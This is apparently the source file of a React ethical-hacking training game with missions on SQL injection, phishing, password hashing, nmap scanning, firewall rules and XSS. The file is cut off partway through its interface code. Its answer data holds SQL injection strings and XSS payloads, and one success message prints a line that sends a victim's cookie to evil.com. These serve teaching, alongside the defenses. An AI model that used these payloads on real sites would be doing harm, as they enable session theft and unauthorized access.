import { useState, useEffect, useRef, useCallback } from "react";

// ============================================================
// GAME DATA - Missions, quizzes, terminal challenges
// ============================================================

const TOPICS = {
  WEB: { id: "WEB", name: "Web App Vulnerabilities", icon: "🌐", color: "#00ff88" },
  SOCIAL: { id: "SOCIAL", name: "Social Engineering", icon: "🎭", color: "#ff6b9d" },
  PASSWD: { id: "PASSWD", name: "Password & Auth", icon: "🔑", color: "#ffd93d" },
  NETWORK: { id: "NETWORK", name: "Network Recon", icon: "📡", color: "#6bc5ff" },
  FIREWALL: { id: "FIREWALL", name: "Firewall & IDS", icon: "🛡️", color: "#c084fc" },
};

const MISSIONS = [
  // === MISSION 1: Web App Vulns - SQL Injection ===
  {
    id: "m1",
    topic: "WEB",
    title: "The Leaky Login",
    subtitle: "SQL Injection Basics",
    difficulty: 1,
    xpReward: 150,
    briefing: `A local e-commerce company "ShopEasy" hired you to test their login page. They suspect hackers have been accessing customer accounts. Your job: find the SQL injection vulnerability in their login form and report it.\n\nSQL Injection happens when a website puts user input directly into a database query without sanitizing it. If the login query looks like:\n\nSELECT * FROM users WHERE username='INPUT' AND password='INPUT'\n\n...an attacker can manipulate the INPUT to trick the database.`,
    phases: [
      {
        type: "terminal",
        prompt: "You've found ShopEasy's login page. Try entering a username that would break the SQL query. The server uses: SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'\n\nType a malicious username to test:",
        hint: "Try using a single quote (') to break out of the string, then add OR 1=1 to make the query always true. Don't forget to comment out the rest with --",
        validAnswers: ["' OR 1=1 --", "' or 1=1 --", "'or 1=1--", "' OR 1=1--", "admin' --", "admin'--", "' OR '1'='1' --", "' OR '1'='1", "1' OR '1'='1"],
        flexMatch: (input) => {
          const s = input.toLowerCase().replace(/\s+/g, " ").trim();
          // Accept short injection format
          if (/^['"]?\s*or\s+1\s*=\s*1/.test(s)) return true;
          if (/^['"]?\s*or\s+['"]1['"]\s*=\s*['"]1/.test(s)) return true;
          if (/^admin['"]?\s*(--)/.test(s)) return true;
          // Accept full query format (user typed the whole SELECT statement)
          if (s.includes("select") && s.includes("from") && s.includes("or") && (s.includes("1=1") || s.includes("'1'='1"))) return true;
          // Accept if they wrapped it with the query context
          if (s.includes("username=") && s.includes("or") && (s.includes("1=1") || s.includes("true"))) return true;
          // Exact matches as fallback
          const exactMatches = ["' or 1=1 --", "' or 1=1--", "'or 1=1--", "'or 1=1 --", "admin' --", "admin'--", "' or '1'='1' --", "' or '1'='1", "1' or '1'='1", "' or 1=1 #", "' or true --"];
          return exactMatches.some(a => s === a.toLowerCase());
        },
        successMsg: "ACCESS GRANTED! The query became:\nSELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'\n\nThe OR 1=1 always evaluates to TRUE, bypassing authentication entirely!",
        failMsg: "That didn't work. Remember: you need to break out of the string with a quote ('), then inject logic that's always true (OR 1=1), and comment out the rest (--).",
      },
      {
        type: "quiz",
        question: "You found the vulnerability! Now, what should you recommend ShopEasy do to FIX this SQL injection flaw?",
        options: [
          { text: "Use parameterized queries / prepared statements", correct: true },
          { text: "Add more password requirements", correct: false },
          { text: "Hide the login page URL", correct: false },
          { text: "Block all single-quote characters from usernames", correct: false },
        ],
        explanation: "Parameterized queries (also called prepared statements) separate the SQL code from the data. The database treats user input as DATA only, never as executable code. This is the #1 defense against SQL injection.\n\nBlocking quotes seems tempting but breaks legitimate names like O'Brien and can be bypassed with encoding tricks.",
      },
      {
        type: "quiz",
        question: "Which of these is ALSO a form of SQL injection?",
        options: [
          { text: "Entering JavaScript code in a comment box", correct: false },
          { text: "Using UNION SELECT to extract data from other tables", correct: true },
          { text: "Sending too many requests to crash the server", correct: false },
          { text: "Guessing someone's password through trial and error", correct: false },
        ],
        explanation: "UNION-based SQL injection lets attackers append additional SELECT queries to extract data from other database tables — like credit card numbers or admin passwords.\n\nThe JavaScript comment attack is XSS (Cross-Site Scripting), too many requests is DoS, and password guessing is brute force — all different attack types!",
      },
    ],
  },
  // === MISSION 2: Social Engineering ===
  {
    id: "m2",
    topic: "SOCIAL",
    title: "Phishing Expedition",
    subtitle: "Spot the Fake",
    difficulty: 1,
    xpReward: 150,
    briefing: `A healthcare company "MedSecure" has been hit by phishing attacks. Three employees clicked malicious links last month. You've been hired to train their staff.\n\nPhishing is when attackers impersonate trusted entities (banks, coworkers, IT departments) to trick people into revealing passwords, clicking malware links, or transferring money.\n\nYour mission: Analyze suspicious emails and identify the phishing indicators.`,
    phases: [
      {
        type: "quiz",
        question: 'Email from: "IT-Department@med-secure.co" (real domain is medsecure.com)\nSubject: "URGENT: Your password expires in 1 hour!"\nBody: "Click here to reset your password immediately or lose access to all systems."\n\nHow many red flags can you spot?',
        options: [
          { text: "1-2 red flags", correct: false },
          { text: "3-4 red flags", correct: true },
          { text: "5+ red flags", correct: false },
          { text: "This looks legitimate", correct: false },
        ],
        explanation: "There are 3-4 clear red flags:\n\n1. WRONG DOMAIN: med-secure.co vs medsecure.com (subtle misspelling)\n2. URGENCY PRESSURE: \"expires in 1 hour\" creates panic\n3. VAGUE THREAT: \"lose access to ALL systems\"\n4. GENERIC LINK: \"Click here\" without showing the actual URL\n\nReal IT departments typically give you days to change passwords and direct you to known internal portals.",
      },
      {
        type: "terminal",
        prompt: 'You need to inspect a suspicious URL. The email contains this link:\n\nhttps://medsecure.com.login-verify.xyz/reset\n\nWhat is the ACTUAL domain this link goes to? Type just the domain:',
        hint: "The real domain is always the last part before the first single slash (/). Everything before that in the hostname can be subdomains designed to trick you.",
        validAnswers: ["login-verify.xyz", "login-verify.xyz/", "www.login-verify.xyz"],
        flexMatch: (input) => {
          const s = input.toLowerCase().replace(/\s+/g, "").trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
          return s.includes("login-verify.xyz");
        },
        successMsg: "Correct! The actual domain is login-verify.xyz — a completely unknown site!\n\n\"medsecure.com\" is just a subdomain used to make it LOOK legitimate. The real domain is always read right-to-left before the first /.\n\nSo: medsecure.com.login-verify.xyz\n         ↑ subdomain (fake)    ↑ REAL domain",
        failMsg: "Look at the URL structure: https://medsecure.com.login-verify.xyz/reset\n\nThe REAL domain is the last part before the path (/reset). 'medsecure.com' here is actually a subdomain of login-verify.xyz!",
      },
      {
        type: "quiz",
        question: "MedSecure wants to protect against phishing. Which combination of defenses is MOST effective?",
        options: [
          { text: "Stronger passwords + antivirus software", correct: false },
          { text: "Multi-factor authentication (MFA) + security awareness training + email filtering", correct: true },
          { text: "Block all external emails", correct: false },
          { text: "Only allow employees to use company phones", correct: false },
        ],
        explanation: "Defense in depth is key:\n\n• MFA means even if credentials are stolen, attackers can't log in without the second factor\n• Training helps employees recognize and report phishing attempts\n• Email filtering catches many phishing emails before they reach inboxes\n\nNo single solution is enough — layers of security give you the best protection.",
      },
    ],
  },
  // === MISSION 3: Password Cracking ===
  {
    id: "m3",
    topic: "PASSWD",
    title: "Cracking the Vault",
    subtitle: "Password Security Fundamentals",
    difficulty: 1,
    xpReward: 150,
    briefing: `A tech startup "VaultTech" asked you to audit their password storage. You discovered they're storing passwords as unsalted MD5 hashes — a critical vulnerability.\n\nWhen you create a password, responsible sites don't store it in plain text. They run it through a HASH function — a one-way mathematical formula that converts "password123" into something like "482c811da5d5b4bc6d497ffa98491e38".\n\nThe problem? If the hash function is weak (like MD5), attackers can reverse it using precomputed tables called "rainbow tables."`,
    phases: [
      {
        type: "terminal",
        prompt: "You found a leaked hash from VaultTech's database:\n\n5f4dcc3b5aa765d61d8327deb882cf99\n\nThis is an MD5 hash. Based on your knowledge, what common password do you think this could be? (Hint: it's the most common password in the world)",
        hint: "It's the most commonly used password globally. Think of what someone types when they can't be bothered to create a real password...",
        validAnswers: ["password", "Password", "PASSWORD"],
        flexMatch: (input) => {
          const s = input.toLowerCase().replace(/['"` ]/g, "").trim();
          return s === "password";
        },
        successMsg: "That's right! The MD5 hash 5f4dcc3b... maps to the word \"password\"\n\nThis took you seconds to guess. An automated tool with a rainbow table would crack this in MILLISECONDS. This is why:\n\n• MD5 is considered BROKEN for password storage\n• Common passwords are pre-computed in massive databases\n• Without 'salting' (adding random data), identical passwords produce identical hashes",
        failMsg: "Not quite — the hash 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 of the word \"password\" — literally the most common password in the world!",
      },
      {
        type: "quiz",
        question: "Which password hashing algorithm should VaultTech switch to?",
        options: [
          { text: "SHA-256 (faster and newer than MD5)", correct: false },
          { text: "bcrypt (designed to be intentionally slow)", correct: true },
          { text: "Base64 encoding (looks like a hash)", correct: false },
          { text: "Double MD5 — hash it twice for extra security", correct: false },
        ],
        explanation: "bcrypt is specifically designed for password hashing because:\n\n• It's intentionally SLOW — this makes brute-force attacks impractical\n• It automatically includes a SALT (random data mixed in)\n• It has a configurable 'work factor' that can be increased as computers get faster\n\nSHA-256 is fast (bad for passwords — helps attackers guess faster). Base64 is encoding, NOT hashing — it's completely reversible. Double-MD5 is trivially defeated.",
      },
      {
        type: "quiz",
        question: "A user's password is: Tr0ub4dor&3\nAnother user's password is: correct-horse-battery-staple\n\nWhich is more secure against cracking?",
        options: [
          { text: "Tr0ub4dor&3 — it has symbols and number substitutions", correct: false },
          { text: "correct-horse-battery-staple — it's longer with more entropy", correct: true },
          { text: "They're equally secure", correct: false },
          { text: "Neither is secure", correct: false },
        ],
        explanation: "This is from the famous XKCD comic! The passphrase 'correct-horse-battery-staple' has roughly 44 bits of entropy vs ~28 bits for 'Tr0ub4dor&3'.\n\nLength beats complexity. A 4-word passphrase is:\n• MUCH harder to crack (exponentially more combinations)\n• MUCH easier to remember\n• Resistant to dictionary attacks when words are random\n\nCharacter substitutions (a→4, o→0) are well-known to crackers and barely add security.",
      },
    ],
  },
  // === MISSION 4: Network Reconnaissance ===
  {
    id: "m4",
    topic: "NETWORK",
    title: "Ghost in the Wire",
    subtitle: "Network Scanning 101",
    difficulty: 2,
    xpReward: 200,
    briefing: `A financial services firm "SecureBank" wants you to perform a penetration test on their network. The first step of any pentest is RECONNAISSANCE — gathering information about the target.\n\nThis is where tools like Nmap come in. Nmap (Network Mapper) scans networks to discover:\n• What hosts/devices are online\n• What ports are open (ports = doors into a computer)\n• What services are running (web servers, databases, etc.)\n• What operating system the target uses\n\nImportant: You ALWAYS need written authorization before scanning. Unauthorized scanning is illegal!`,
    phases: [
      {
        type: "terminal",
        prompt: "You have authorization to scan SecureBank's server at 10.0.1.50.\n\nNmap uses this syntax: nmap [scan type] [target]\n\nCommon scan types:\n  -sS = Stealth SYN scan\n  -sV = Service version detection\n  -O  = OS detection\n  -p  = Specify ports\n\nWrite an nmap command to do a stealth scan with service detection on the target:",
        hint: "Combine the -sS flag (stealth) with -sV (service version) followed by the target IP address.",
        validAnswers: [
          "nmap -sS -sV 10.0.1.50", "nmap -sV -sS 10.0.1.50",
          "nmap -sS -sV -O 10.0.1.50", "nmap -sSV 10.0.1.50",
          "nmap -sS -sV -p- 10.0.1.50",
        ],
        flexMatch: (input) => {
          const s = input.toLowerCase().replace(/\s+/g, " ").trim();
          // Must start with nmap, include the target IP, and have at least -sS and -sV (or combined -sSV)
          if (!s.startsWith("nmap")) return false;
          if (!s.includes("10.0.1.50")) return false;
          const hasStealth = s.includes("-ss") || s.includes("-ssv");
          const hasVersion = s.includes("-sv") || s.includes("-ssv");
          return hasStealth && hasVersion;
        },
        successMsg: "Scanning...\n\nPORT      STATE   SERVICE    VERSION\n22/tcp    open    ssh        OpenSSH 7.4\n80/tcp    open    http       Apache 2.4.6\n443/tcp   open    https      Apache 2.4.6\n3306/tcp  open    mysql      MySQL 5.7.32\n8080/tcp  open    http-proxy Squid 3.5.20\n\nCritical findings:\n• MySQL (3306) is exposed to the network — databases should NEVER be publicly accessible\n• Apache 2.4.6 is outdated — known vulnerabilities exist\n• SSH is open — needs key-based auth, not passwords",
        failMsg: "Remember the syntax: nmap [flags] [target IP]\n\nUse -sS for stealth scan and -sV for service version detection. The target is 10.0.1.50",
      },
      {
        type: "quiz",
        question: "The scan revealed MySQL (port 3306) is open to the network. Why is this a critical finding?",
        options: [
          { text: "MySQL is always insecure regardless of configuration", correct: false },
          { text: "Attackers can directly attempt to connect and exploit the database", correct: true },
          { text: "Port 3306 is reserved for malware", correct: false },
          { text: "It means the server has no firewall", correct: false },
        ],
        explanation: "Exposing a database directly to the network means attackers can:\n\n• Attempt brute-force login attacks against the database\n• Exploit known MySQL vulnerabilities for that version\n• If they get in, directly steal or modify ALL data\n\nDatabases should only accept connections from the application server (localhost or a specific internal IP), never from the open network. This is called the 'principle of least exposure.'",
      },
      {
        type: "quiz",
        question: "Before running any scan on SecureBank, what is LEGALLY required?",
        options: [
          { text: "Nothing — scanning public IPs is always legal", correct: false },
          { text: "Verbal permission from any employee", correct: false },
          { text: "A signed scope of work / written authorization", correct: true },
          { text: "Just an NDA (non-disclosure agreement)", correct: false },
        ],
        explanation: "ALWAYS get written authorization that clearly defines:\n\n• SCOPE: Exactly which IPs/systems you can test\n• TIMEFRAME: When testing is allowed\n• METHODS: What techniques are permitted\n• CONTACT: Who to call if something breaks\n\nWithout this, even well-intentioned scanning can be prosecuted under computer fraud laws (like the CFAA in the US). This is what separates ethical hackers from criminals.",
      },
    ],
  },
  // === MISSION 5: Firewall & IDS ===
  {
    id: "m5",
    topic: "FIREWALL",
    title: "The Watchtower",
    subtitle: "Firewall Rules & Intrusion Detection",
    difficulty: 2,
    xpReward: 200,
    briefing: `SecureBank's network scan revealed serious issues. Now they want you to help configure their firewall and set up intrusion detection.\n\nA FIREWALL is like a security guard at a door — it decides what network traffic is allowed in and out based on rules. Rules typically specify:\n• Source IP (where traffic comes from)\n• Destination port (which "door" it's knocking on)\n• Protocol (TCP, UDP, ICMP)\n• Action (ALLOW or DENY)\n\nAn IDS (Intrusion Detection System) is like a security camera — it monitors traffic for suspicious patterns and alerts you.`,
    phases: [
      {
        type: "terminal",
        prompt: "SecureBank's MySQL (port 3306) is exposed to everyone. Write an iptables firewall rule to BLOCK all external access to port 3306 EXCEPT from the application server at 10.0.1.10.\n\nFormat: iptables -A INPUT [options]\nUseful flags: -p tcp, --dport, -s (source IP), -j ACCEPT/DROP",
        hint: "You need TWO rules: first ACCEPT traffic from 10.0.1.10 to port 3306, then DROP everything else to port 3306. Rules are processed in order!",
        validAnswers: [
          "iptables -A INPUT -p tcp -s 10.0.1.10 --dport 3306 -j ACCEPT",
          "iptables -A INPUT -s 10.0.1.10 -p tcp --dport 3306 -j ACCEPT",
          "iptables -A INPUT -p tcp --dport 3306 -s 10.0.1.10 -j ACCEPT",
        ],
        flexMatch: (input) => {
          const s = input.toLowerCase().replace(/\s+/g, " ").trim();
          // Must have iptables, INPUT chain, tcp protocol, source IP, port 3306, and ACCEPT
          if (!s.includes("iptables")) return false;
          if (!s.includes("input")) return false;
          if (!s.includes("tcp")) return false;
          if (!s.includes("10.0.1.10")) return false;
          if (!s.includes("3306")) return false;
          if (!s.includes("accept")) return false;
          return true;
        },
        successMsg: "Rule applied! Now you'd also add:\niptables -A INPUT -p tcp --dport 3306 -j DROP\n\nThis creates a whitelist:\n1. IF source is 10.0.1.10 AND port is 3306 → ALLOW ✓\n2. IF port is 3306 (from anyone else) → BLOCK ✗\n\nRules are processed top-to-bottom. The specific ACCEPT rule must come BEFORE the general DROP rule, or the app server would also be blocked!",
        failMsg: "The format is: iptables -A INPUT -p tcp -s [source IP] --dport [port] -j ACCEPT\n\nYou want to allow source 10.0.1.10 to reach port 3306 via TCP.",
      },
      {
        type: "quiz",
        question: "An IDS alerts you to this pattern:\n\n10 failed SSH login attempts from 185.220.101.x in 30 seconds, each trying a different username.\n\nWhat type of attack is this?",
        options: [
          { text: "SQL injection attack", correct: false },
          { text: "Brute force / credential stuffing attack", correct: true },
          { text: "Man-in-the-middle attack", correct: false },
          { text: "DNS poisoning", correct: false },
        ],
        explanation: "This is a brute-force attack — systematically trying many username/password combinations to find valid credentials.\n\nDefenses include:\n• fail2ban: Automatically blocks IPs after X failed attempts\n• Key-based SSH auth: Disables password login entirely\n• Rate limiting: Slows down connection attempts\n• Port knocking: Hides SSH behind a secret sequence\n\nThe IP range 185.220.101.x is actually known for Tor exit nodes commonly used in real attacks!",
      },
      {
        type: "quiz",
        question: "What is the fundamental difference between a firewall and an IDS?",
        options: [
          { text: "Firewalls are hardware, IDS is software", correct: false },
          { text: "Firewalls BLOCK traffic by rules, IDS DETECTS and ALERTS on suspicious patterns", correct: true },
          { text: "IDS is more secure than firewalls", correct: false },
          { text: "Firewalls only work on internal networks", correct: false },
        ],
        explanation: "Think of it this way:\n\n• FIREWALL = Bouncer at the door (blocks/allows based on simple rules)\n• IDS = Security camera system (watches everything, alerts on suspicious behavior)\n• IPS = Security camera + auto-lock (detects AND automatically blocks threats)\n\nYou need BOTH: the firewall stops known-bad traffic, while the IDS catches sophisticated attacks that slip through the rules.",
      },
    ],
  },
  // === MISSION 6: Advanced XSS ===
  {
    id: "m6",
    topic: "WEB",
    title: "Script Kiddie No More",
    subtitle: "Cross-Site Scripting (XSS)",
    difficulty: 2,
    xpReward: 200,
    briefing: `ShopEasy fixed their SQL injection (nice work!), but now users report strange pop-ups and their sessions being hijacked. You suspect Cross-Site Scripting (XSS).\n\nXSS happens when an attacker injects malicious JavaScript into a website that other users' browsers then execute. Imagine posting a "comment" that's actually code — when other users view it, the code runs in THEIR browser.\n\nThree types:\n• Reflected XSS: Malicious script in a URL parameter\n• Stored XSS: Script saved in the database (comments, profiles)\n• DOM-based XSS: Script manipulates the page's JavaScript directly`,
    phases: [
      {
        type: "terminal",
        prompt: "ShopEasy has a search bar that displays: \"You searched for: [your input]\"\n\nThe input is inserted directly into the HTML without sanitization. Write a basic XSS payload that would display an alert box to prove the vulnerability exists:",
        hint: "The classic proof-of-concept for XSS is injecting a <script> tag with an alert() function inside it.",
        validAnswers: [
          "<script>alert('XSS')</script>",
          "<script>alert(1)</script>",
          "<script>alert('xss')</script>",
          "<script>alert(\"XSS\")</script>",
          "<img src=x onerror=alert(1)>",
          "<img src=x onerror=alert('XSS')>",
        ],
        flexMatch: (input) => {
          const s = input.toLowerCase().trim();
          // Accept any script tag with alert
          if (s.includes("<script>") && s.includes("alert(") && s.includes("</script>")) return true;
          // Accept img onerror payloads
          if (s.includes("<img") && s.includes("onerror") && s.includes("alert(")) return true;
          // Accept svg onload
          if (s.includes("<svg") && s.includes("onload") && s.includes("alert(")) return true;
          // Accept any tag with an event handler and alert
          if (s.includes("alert(") && (s.includes("onerror") || s.includes("onload") || s.includes("onmouseover") || s.includes("<script"))) return true;
          return false;
        },
        successMsg: "The page now shows a JavaScript alert! This proves the site is vulnerable.\n\nIn a real attack, instead of alert(), an attacker would use:\n\ndocument.location='https://evil.com/steal?cookie='+document.cookie\n\nThis silently sends the victim's session cookie to the attacker, who can then impersonate them!\n\nNote: We use alert() only as a harmless proof-of-concept. Never exploit XSS on sites without authorization.",
        failMsg: "Try injecting an HTML script tag: <script>alert('XSS')</script>\n\nOr use an image tag with an error handler: <img src=x onerror=alert(1)>",
      },
      {
        type: "quiz",
        question: "What's the BEST defense against XSS attacks?",
        options: [
          { text: "Block all JavaScript on the site", correct: false },
          { text: "Output encoding + Content Security Policy (CSP)", correct: true },
          { text: "Use HTTPS instead of HTTP", correct: false },
          { text: "Limit comment length to 100 characters", correct: false },
        ],
        explanation: "Two-layer defense:\n\n1. OUTPUT ENCODING: Convert special characters before displaying them\n   < becomes &lt;  > becomes &gt;\n   So <script> is displayed as text, not executed as code\n\n2. CONTENT SECURITY POLICY (CSP): HTTP header that tells browsers which scripts are allowed to run. Even if XSS is injected, CSP blocks unauthorized scripts.\n\nHTTPS protects data in transit but doesn't prevent XSS. Length limits are easily bypassed.",
      },
      {
        type: "quiz",
        question: "Which type of XSS is MOST dangerous and why?",
        options: [
          { text: "Reflected — because it's the most common", correct: false },
          { text: "Stored — because it affects every user who views the page automatically", correct: true },
          { text: "DOM-based — because it can't be detected by servers", correct: false },
          { text: "They're all equally dangerous", correct: false },
        ],
        explanation: "Stored XSS is most dangerous because:\n\n• The malicious script is permanently saved on the server\n• EVERY user who visits that page gets attacked automatically\n• No special link or user action needed — just viewing the page\n• It can persist for months if undetected\n\nA stored XSS in a popular forum comment could compromise thousands of users. Reflected XSS requires each victim to click a malicious link.",
      },
    ],
  },
];

// ============================================================
// MAIN APP
// ============================================================

export default function CyberSecGame() {
  const [screen, setScreen] = useState("hub"); // hub | mission | debrief
  const [currentMission, setCurrentMission] = useState(null);
  const [currentPhase, setCurrentPhase] = useState(0);
  const [xp, setXp] = useState(0);
  const [completedMissions, setCompletedMissions] = useState([]);
  const [terminalInput, setTerminalInput] = useState("");
  const [terminalHistory, setTerminalHistory] = useState([]);
  const [phaseResult, setPhaseResult] = useState(null); // null | "success" | "fail"
  const [selectedAnswer, setSelectedAnswer] = useState(null);
  const [showExplanation, setShowExplanation] = useState(false);
  const [missionXpEarned, setMissionXpEarned] = useState(0);
  const [phaseXpTracker, setPhaseXpTracker] = useState(0);
  const [showHint, setShowHint] = useState(false);
  const [scanlineVisible, setScanlineVisible] = useState(true);
  const termRef = useRef(null);
  const inputRef = useRef(null);

  const level = Math.floor(xp / 300) + 1;
  const xpInLevel = xp % 300;
  const levelTitle = level <= 1 ? "Script Kiddie" : level <= 2 ? "Junior Analyst" : level <= 3 ? "Pentester" : level <= 4 ? "Security Engineer" : "Elite Hacker";

  const startMission = (mission) => {
    setCurrentMission(mission);
    setCurrentPhase(0);
    setPhaseResult(null);
    setSelectedAnswer(null);
    setShowExplanation(false);
    setTerminalInput("");
    setTerminalHistory([]);
    setMissionXpEarned(0);
    setPhaseXpTracker(0);
    setShowHint(false);
    setScreen("mission");
  };

  const nextPhase = () => {
    if (currentPhase < currentMission.phases.length - 1) {
      setCurrentPhase(prev => prev + 1);
      setPhaseResult(null);
      setSelectedAnswer(null);
      setShowExplanation(false);
      setTerminalInput("");
      setTerminalHistory([]);
      setShowHint(false);
    } else {
      // Mission complete
      if (!completedMissions.includes(currentMission.id)) {
        setCompletedMissions(prev => [...prev, currentMission.id]);
        setXp(prev => prev + currentMission.xpReward);
        setMissionXpEarned(currentMission.xpReward);
      }
      setScreen("debrief");
    }
  };

  const handleTerminalSubmit = () => {
    if (!terminalInput.trim()) return;
    const phase = currentMission.phases[currentPhase];
    const input = terminalInput.trim();
    const isCorrect = phase.flexMatch
      ? phase.flexMatch(input)
      : phase.validAnswers.some(a =>
          input.toLowerCase().replace(/\s+/g, " ").trim() === a.toLowerCase().replace(/\s+/g, " ").trim()
        );

    const newHistory = [
      ...terminalHistory,
      { type: "input", text: input },
      { type: isCorrect ? "success" : "error", text: isCorrect ? phase.successMsg : phase.failMsg },
    ];
    setTerminalHistory(newHistory);
    setTerminalInput("");

    if (isCorrect) {
      setPhaseResult("success");
      setPhaseXpTracker(prev => prev + 50);
    }

    setTimeout(() => {
      if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
    }, 50);
  };

  const handleQuizAnswer = (optionIndex) => {
    if (selectedAnswer !== null) return;
    setSelectedAnswer(optionIndex);
    const phase = currentMission.phases[currentPhase];
    const isCorrect = phase.options[optionIndex].correct;
    setPhaseResult(isCorrect ? "success" : "fail");
    setShowExplanation(true);
    if (isCorrect) setPhaseXpTracker(prev => prev + 50);
  };

  const phase = currentMission?.phases?.[currentPhase];
  const topicInfo = currentMission ? TOPICS[currentMission.topic] : null;

  // ============================================================
  // RENDER
  // ============================================================

  return (
    <div style={{
      minHeight: "100vh",
      background: "#050a08",
      color: "#c0d8c0",
      fontFamily: "'Courier New', 'Lucida Console', monospace",
      position: "relative",
      overflow: "hidden",
    }}>
      {/* Scanline overlay */}
      {scanlineVisible && (
        <div style={{
          position: "fixed", inset: 0, pointerEvents: "none", zIndex: 50,
          background: "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,60,0.015) 2px, rgba(0,255,60,0.015) 4px)",
        }} />
      )}
      {/* Vignette */}
      <div style={{
        position: "fixed", inset: 0, pointerEvents: "none", zIndex: 49,
        background: "radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%)",
      }} />

      {/* === HUB SCREEN === */}
      {screen === "hub" && (
        <div style={{ maxWidth: 900, margin: "0 auto", padding: "24px 16px", position: "relative", zIndex: 10 }}>
          {/* Header */}
          <div style={{ textAlign: "center", marginBottom: 32 }}>
            <div style={{
              fontSize: 11, color: "#2a6a3a", letterSpacing: "0.3em",
              textTransform: "uppercase", marginBottom: 8,
            }}>
              [ ETHICAL HACKING TRAINING PLATFORM ]
            </div>
            <h1 style={{
              fontSize: 36, fontWeight: 700, color: "#00ff88",
              margin: 0, letterSpacing: "0.08em",
              textShadow: "0 0 30px rgba(0,255,136,0.3), 0 0 60px rgba(0,255,136,0.1)",
            }}>
              CYBEROPS_
            </h1>
            <div style={{
              fontSize: 12, color: "#3a7a4a", marginTop: 6,
              fontStyle: "italic",
            }}>
              Learn to hack. Learn to defend. Stay ethical.
            </div>
          </div>

          {/* Player stats */}
          <div style={{
            display: "flex", gap: 16, marginBottom: 28,
            flexWrap: "wrap", justifyContent: "center",
          }}>
            <div style={{
              background: "rgba(0,255,136,0.04)", border: "1px solid rgba(0,255,136,0.15)",
              borderRadius: 8, padding: "14px 20px", flex: "1 1 200px", maxWidth: 280,
            }}>
              <div style={{ fontSize: 10, color: "#3a7a4a", letterSpacing: "0.15em", textTransform: "uppercase" }}>
                RANK
              </div>
              <div style={{ fontSize: 20, color: "#00ff88", marginTop: 4 }}>
                Lvl {level} — {levelTitle}
              </div>
              <div style={{
                height: 4, background: "#0a1a0e", borderRadius: 2, marginTop: 8, overflow: "hidden",
              }}>
                <div style={{
                  height: "100%", width: `${(xpInLevel / 300) * 100}%`,
                  background: "linear-gradient(90deg, #00ff88, #00cc6a)",
                  borderRadius: 2, transition: "width 0.5s",
                }} />
              </div>
              <div style={{ fontSize: 10, color: "#2a5a3a", marginTop: 4 }}>
                {xpInLevel}/300 XP to next level
              </div>
            </div>
            <div style={{
              background: "rgba(0,255,136,0.04)", border: "1px solid rgba(0,255,136,0.15)",
              borderRadius: 8, padding: "14px 20px", flex: "1 1 200px", maxWidth: 280,
            }}>
              <div style={{ fontSize: 10, color: "#3a7a4a", letterSpacing: "0.15em", textTransform: "uppercase" }}>
                PROGRESS
              </div>
              <div style={{ fontSize: 20, color: "#00ff88", marginTop: 4 }}>
                {completedMissions.length}/{MISSIONS.length} Missions
              </div>
              <div style={{ fontSize: 12, color: "#3a7a4a", marginTop: 6 }}>
                Total XP: {xp}
              </div>
            </div>
          </div>

          {/* Topic legend */}
          <div style={{
            display: "flex", gap: 10, flexWrap: "wrap", justifyContent: "center",
            marginBottom: 24,
          }}>
            {Object.values(TOPICS).map(t => (
              <div key={t.id} style={{
                fontSize: 11, color: t.color, opacity: 0.7,
                display: "flex", alignItems: "center", gap: 4,
              }}>
                <span>{t.icon}</span> {t.name}
              </div>
            ))}
          </div>

          {/* Mission cards */}
          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))",
            gap: 14,
          }}>
            {MISSIONS.map((m) => {
              const topic = TOPICS[m.topic];
              const completed = completedMissions.includes(m.id);
              return (
                <div key={m.id}
                  onClick={() => startMission(m)}
                  style={{
                    background: completed ? "rgba(0,255,136,0.06)" : "rgba(255,255,255,0.02)",
                    border: "1px solid",
                    borderColor: completed ? "rgba(0,255,136,0.25)" : "rgba(255,255,255,0.06)",
                    borderRadius: 8,
                    padding: 18,
                    cursor: "pointer",
                    transition: "all 0.2s",
                    position: "relative",
                    overflow: "hidden",
                  }}
                  onMouseEnter={e => {
                    e.currentTarget.style.borderColor = topic.color;
                    e.currentTarget.style.boxShadow = `0 0 20px ${topic.color}15`;
                  }}
                  onMouseLeave={e => {
                    e.currentTarget.style.borderColor = completed ? "rgba(0,255,136,0.25)" : "rgba(255,255,255,0.06)";
                    e.currentTarget.style.boxShadow = "none";
                  }}
                >
                  {completed && (
                    <div style={{
                      position: "absolute", top: 10, right: 12,
                      fontSize: 16, color: "#00ff88",
                    }}>✓</div>
                  )}
                  <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
                    <span style={{ fontSize: 20 }}>{topic.icon}</span>
                    <span style={{
                      fontSize: 10, color: topic.color, letterSpacing: "0.1em",
                      textTransform: "uppercase", opacity: 0.8,
                    }}>{topic.name}</span>
                  </div>
                  <div style={{ fontSize: 16, color: "#e0f0e0", fontWeight: 700, marginBottom: 4 }}>
                    {m.title}
                  </div>
                  <div style={{ fontSize: 12, color: "#4a7a5a", marginBottom: 10 }}>
                    {m.subtitle}
                  </div>
                  <div style={{ display: "flex", gap: 12, alignItems: "center" }}>
                    <span style={{ fontSize: 10, color: "#3a6a4a" }}>
                      {"⬟".repeat(m.difficulty)}{"⬡".repeat(3 - m.difficulty)} Difficulty
                    </span>
                    <span style={{ fontSize: 10, color: "#ffd93d" }}>
                      +{m.xpReward} XP
                    </span>
                  </div>
                </div>
              );
            })}
          </div>

          <div style={{
            textAlign: "center", marginTop: 32, fontSize: 11, color: "#1a3a2a",
          }}>
            [ More missions unlocking soon... ]
          </div>
        </div>
      )}

      {/* === MISSION SCREEN === */}
      {screen === "mission" && currentMission && phase && (
        <div style={{ maxWidth: 800, margin: "0 auto", padding: "20px 16px", position: "relative", zIndex: 10 }}>
          {/* Mission header */}
          <div style={{
            display: "flex", justifyContent: "space-between", alignItems: "center",
            marginBottom: 20, flexWrap: "wrap", gap: 10,
          }}>
            <button onClick={() => setScreen("hub")} style={{
              background: "none", border: "1px solid rgba(255,255,255,0.1)",
              color: "#4a7a5a", fontSize: 11, padding: "6px 14px", borderRadius: 4,
              cursor: "pointer", fontFamily: "inherit",
            }}>
